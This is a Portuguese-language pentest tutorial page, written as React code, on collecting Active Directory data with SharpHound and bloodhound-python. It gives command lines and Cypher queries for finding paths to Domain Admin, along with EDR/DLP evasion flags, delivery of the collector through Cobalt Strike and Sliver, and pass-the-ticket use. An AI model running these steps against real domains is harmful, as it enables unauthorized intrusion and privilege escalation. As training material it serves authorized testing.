import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function SharpHound() {
  return (
    <PageContainer
      title="SharpHound — coletor do BloodHound"
      subtitle="Coletor C# (SharpHound.exe) e equivalente Python (bloodhound-python). Enumera AD, gera ZIP e alimenta queries Cypher no Neo4j."
      difficulty="avancado"
      timeToRead="20 min"
      prompt="ad/sharphound"
    >
      <h2>O que é SharpHound (e por que existe BloodHound.py)</h2>
      <p>
        <strong>SharpHound</strong> é o coletor oficial do BloodHound (SpecterOps). Escrito em
        C#, roda do lado Windows (binário <code>SharpHound.exe</code> ou cmdlet PowerShell
        <code>Invoke-BloodHound</code>) e enumera Active Directory via LDAP, SMB, RPC e WinRM.
        Ele empacota a coleta em um ZIP que você importa no <strong>BloodHound CE</strong>{" "}
        (frontend + Neo4j) para visualizar caminhos de ataque (Domain User → Domain Admin).
      </p>
      <p>
        Quando você não tem como dropar binário no alvo (EDR pesado, política de allowlist),
        usa <strong>bloodhound-python</strong> (BloodHound.py): mesmo output, rodando do seu
        Kali, mirando o DC com credenciais válidas. É o caminho preferido em 2025 para coleta
        OPSEC-friendly.
      </p>

      <AlertBox type="warning" title="Sempre dentro do escopo">
        <p>
          Coleta de AD inteiro gera milhares de queries LDAP — fácil de detectar por SOC maduro
          (regras Sentinel para 4662/4661 em volume). Faça apenas com autorização contratual e,
          se possível, em janela acordada com o blue team.
        </p>
      </AlertBox>

      <h2>Métodos de coleta — CollectionMethods</h2>
      <CommandTable
        title="--CollectionMethods (SharpHound) / -c (bloodhound-python)"
        variations={[
          { cmd: "Default", desc: "Group, LocalAdmin, Session, Trusts, ACL, ObjectProps, SPN, Container.", output: "Coleta padrão balanceada — ponto de partida." },
          { cmd: "All", desc: "Default + LoggedOn + GPOLocalGroup. Mais barulhento.", output: "Use só se autorizado e com tempo." },
          { cmd: "DCOnly", desc: "Apenas LDAP no DC. NÃO toca em workstations.", output: "Stealthy: zero RPC/SMB em endpoint." },
          { cmd: "Session", desc: "Lista sessões em hosts (NetSessionEnum).", output: "Identifica onde admins estão logados." },
          { cmd: "LoggedOn", desc: "Quem está logado AGORA (precisa privilégio).", output: "Mais ruidoso, requer SMB+RPC em cada host." },
          { cmd: "ACL", desc: "Permissões em objetos AD (DACLs).", output: "Achados: WriteDACL, GenericAll = exploration paths." },
          { cmd: "ObjectProps", desc: "Atributos: serviceprincipalname, description, useraccountcontrol.", output: "Necessário para Kerberoast/ASREPRoast." },
          { cmd: "Trusts", desc: "Relações de confiança entre domínios.", output: "Pivot multi-domain forest." },
          { cmd: "Container", desc: "Hierarquia OU/Container para escopo de GPO.", output: "Útil para mostrar abrangência no relatório." },
        ]}
      />

      <h2>SharpHound.exe no Windows alvo</h2>
      <Terminal
        path="C:\\Users\\jsmith"
        lines={[
          {
            comment: "coleta padrão DCOnly + ObjectProps, ZIP fora da pasta padrão",
            cmd: "SharpHound.exe --CollectionMethods DCOnly,ObjectProps --OutputDirectory C:\\Windows\\Temp --OutputPrefix engagement01 --RandomFilenames",
            out: `2026-04-03T11:14:32.001-03:00|INFORMATION|Resolved Collection Methods: DCOnly, ObjectProps
2026-04-03T11:14:32.412-03:00|INFORMATION|Initializing SharpHound at 11:14 on 4/3/2026
2026-04-03T11:14:33.118-03:00|INFORMATION|Beginning LDAP search for ACME.CORP
2026-04-03T11:14:51.901-03:00|INFORMATION|Status: 4127 objects finished (avg 215/s)
2026-04-03T11:14:55.244-03:00|INFORMATION|Output written to C:\\Windows\\Temp\\fhT4qK.zip`,
            outType: "success",
          },
          {
            comment: "mais OPSEC: cifra o ZIP e exclui DCs específicos",
            cmd: 'SharpHound.exe -c All --ExcludeDCs --ZipPassword "S3nh4F0rt3" --OutputDirectory C:\\Windows\\Temp',
            out: `[+] ZIP encrypted with password protection
[+] Output written to C:\\Windows\\Temp\\20260403111501_BloodHound.zip`,
            outType: "info",
          },
          {
            comment: "uso com credenciais alternativas (LDAP-only sem precisar do user atual)",
            cmd: 'SharpHound.exe -c DCOnly --LdapUsername jsmith --LdapPassword "P@ssw0rd!" --DomainController dc01.acme.corp',
            out: "Authenticated as jsmith@ACME.CORP\nLDAP search complete.",
            outType: "warning",
          },
        ]}
      />

      <h3>Flags de stealth essenciais</h3>
      <CommandTable
        title="opções OPSEC do SharpHound"
        variations={[
          { cmd: "--Stealth", desc: "Pula NetSessionEnum, usa apenas LDAP/registry.", output: "Reduz drasticamente eventos 4624/4625." },
          { cmd: "--ExcludeDCs", desc: "Não enumera DCs (evita logs de auditoria centralizados).", output: "Combine com DCOnly para um paradoxo." },
          { cmd: "--Throttle 1000 --Jitter 30", desc: "Atrasa cada request 1s ± 30%.", output: "Dilui pico de queries no SIEM." },
          { cmd: "--RandomFilenames", desc: "Nomes aleatórios para JSON/ZIP.", output: "Burla DLP/EDR baseados em path/name." },
          { cmd: "--MemCache", desc: "Cache em memória, não toca disco com .bin.", output: "Sem artefatos forenses persistentes." },
          { cmd: "--Loop --LoopDuration 02:00:00", desc: "Coleta sessions repetidamente por 2h.", output: "Aumenta chance de pegar admin logado." },
          { cmd: "--ZipPassword PASS", desc: "Cifra o ZIP com password.", output: "Anti-DLP / anti-VirusTotal." },
        ]}
      />

      <h2>bloodhound-python (Linux side, sem binário no alvo)</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo apt install -y bloodhound.py",
            out: "Setting up bloodhound.py (1.7.2-0kali1) ...",
            outType: "muted",
          },
          {
            comment: "coleta DCOnly via LDAP a partir do Kali",
            cmd: "bloodhound-python -u jsmith -p 'P@ssw0rd!' -d acme.corp -ns 10.10.10.1 -c DCOnly --zip",
            out: `INFO: Found AD domain: acme.corp
INFO: Connecting to LDAP server: dc01.acme.corp
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 247 computers
INFO: Connecting to LDAP server: dc01.acme.corp
INFO: Found 1843 users
INFO: Found 412 groups
INFO: Found 18 trusts
INFO: Done in 00M 47S
INFO: Compressing output into 20260403111842_bloodhound.zip`,
            outType: "success",
          },
          {
            comment: "coleta All com Kerberos ticket (pass-the-ticket)",
            cmd: "KRB5CCNAME=/tmp/jsmith.ccache bloodhound-python -u jsmith -k --no-pass -d acme.corp -ns 10.10.10.1 -c All --zip",
            out: `INFO: Authenticated using Kerberos ticket
INFO: Found 247 computers
INFO: Sessions: collecting via wmi/srvsvc ...
INFO: Done in 03M 12S`,
            outType: "info",
          },
        ]}
      />

      <h2>Rodando via C2 — execute-assembly e nxc</h2>
      <CodeBlock
        language="bash"
        title="3 caminhos comuns para entregar o coletor"
        code={`# 1) Cobalt Strike — execute-assembly carrega o .NET em memória
beacon> execute-assembly /opt/SharpHound/SharpHound.exe -c DCOnly --MemCache --RandomFilenames

# 2) Sliver — mesma ideia, sem tocar disco do alvo
sliver (WS-USR07) > execute-assembly --inject /opt/SharpHound.exe -c DCOnly,ObjectProps

# 3) NetExec (ex-CME) — chama bloodhound-python embutido pra coletar via SMB cred
nxc smb dc01.acme.corp -u jsmith -p 'P@ssw0rd!' -d acme.corp \\
    -M bloodhound -o COLLECTION=All

# 4) bloodhound-python via proxychains (pivot SOCKS5 do Sliver/Chisel)
proxychains bloodhound-python -u jsmith -p 'P@ssw0rd!' -d acme.corp \\
    -ns 10.10.10.1 -c DCOnly --zip`}
      />

      <h2>Importar no BloodHound CE</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "subir BloodHound CE via Docker compose oficial",
            cmd: "curl -L https://ghst.ly/getbhce -o docker-compose.yml && docker compose up -d",
            out: `[+] Running 4/4
 ✔ Container bloodhound-ce-app-db-1   Started
 ✔ Container bloodhound-ce-graph-db-1 Started
 ✔ Container bloodhound-ce-bloodhound-1 Started
[*] BloodHound CE running on http://localhost:8080
[*] Initial password printed to: docker compose logs bloodhound | grep "Initial Password"`,
            outType: "success",
          },
          {
            comment: "no navegador → File Ingest → arrastar engagement01.zip",
            cmd: "ls -lh ~/loot/*.zip",
            out: `-rw-r--r-- 1 wallyson wallyson 4.2M Apr  3 11:42 engagement01.zip`,
            outType: "info",
          },
          {
            comment: "ingest também via API (CLI)",
            cmd: "bloodhound-cli ingest --file engagement01.zip --token $BH_TOKEN",
            out: "Ingested 4127 objects in 8.2s",
            outType: "muted",
          },
        ]}
      />

      <h2>Queries Cypher essenciais</h2>
      <CodeBlock
        language="cypher"
        title="snippets que sempre rodam pós-ingest"
        code={`// 1) Shortest path de qualquer Domain User para Domain Admins
MATCH p=shortestPath((u:User {domain:"ACME.CORP"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@ACME.CORP"}))
WHERE NOT u.name STARTS WITH "krbtgt"
RETURN p LIMIT 25

// 2) Usuários Kerberoastable (têm SPN)
MATCH (u:User {hasspn:true})
RETURN u.name, u.serviceprincipalnames

// 3) ASREPRoastable (DontReqPreAuth)
MATCH (u:User {dontreqpreauth:true})
RETURN u.name

// 4) Sessões de Domain Admin em workstations comuns
MATCH (c:Computer)-[:HasSession]->(u:User)
MATCH (u)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@ACME.CORP"})
RETURN c.name, u.name

// 5) Computadores com unconstrained delegation (alvo de coerce + S4U2Self)
MATCH (c:Computer {unconstraineddelegation:true})
RETURN c.name

// 6) Edges WriteDACL/GenericAll de objeto que o user controla
MATCH p=(u:User {name:"JSMITH@ACME.CORP"})-[:WriteDacl|GenericAll|GenericWrite|Owns*1..]->(t)
RETURN p`}
      />

      <PracticeBox
        title="Coletar AD com bloodhound-python e visualizar caminho até DA"
        goal="Em um lab com DC controller acessível, gerar o ZIP de coleta DCOnly e abrir o shortest path até Domain Admins."
        steps={[
          "Instale bloodhound.py e suba o BloodHound CE com docker compose.",
          "Rode bloodhound-python apontando para o DC com credenciais low-priv.",
          "Faça login no BloodHound CE (http://localhost:8080) e ingira o ZIP.",
          "Cole a query 'Shortest path to Domain Admins' e analise o caminho.",
          "Documente as edges encontradas (GenericAll, MemberOf, AddMember, ForceChangePassword).",
        ]}
        command={`sudo apt install -y bloodhound.py
curl -L https://ghst.ly/getbhce -o docker-compose.yml
docker compose up -d
bloodhound-python -u low_user -p 'lab123!' -d lab.local -ns 10.10.10.1 -c DCOnly --zip
# ingest pelo navegador, depois rode a query do comentário acima`}
        expected={`INFO: Found AD domain: lab.local
INFO: Found 1 domains
INFO: Found 12 computers
INFO: Found 47 users
INFO: Compressing output into 20260403112501_bloodhound.zip
[+] BloodHound CE: http://localhost:8080
Ingested 47 users, 12 computers, 18 groups`}
        verify="No BloodHound, query 'Shortest Paths to Domain Admins' deve retornar pelo menos 1 caminho. Cada nó/edge clicável mostra detalhes para o relatório."
      />

      <AlertBox type="info" title="SharpHound vs bloodhound-python — quando usar cada">
        <p>
          <strong>SharpHound.exe</strong>: quando você já tem RCE/sessão em host Windows do
          domínio e quer Session/LoggedOn ricos via SMB/RPC. Mais completo, mais barulhento.
          <br />
          <strong>bloodhound-python</strong>: quando você só tem credenciais (low-priv),
          conectividade LDAP ao DC e quer ficar do lado Linux sem dropar binário. OPSEC-friendly,
          ideal para coleta inicial e relatórios externos.
        </p>
      </AlertBox>

      <AlertBox type="success" title="Próximo passo: explorar caminhos">
        <p>
          Depois de mapear, pegue cada edge "exploitable" e vá para a página correta do guia:{" "}
          <strong>Kerberoasting</strong> (SPN), <strong>Rubeus</strong> (S4U/UnPAC), <strong>Mimikatz</strong>{" "}
          (DCSync), <strong>Impacket</strong> (secretsdump), <strong>CrackMapExec / NetExec</strong>{" "}
          (movimentação lateral). BloodHound é o mapa — as outras ferramentas são o caminho.
        </p>
      </AlertBox>
    </PageContainer>
  );
}
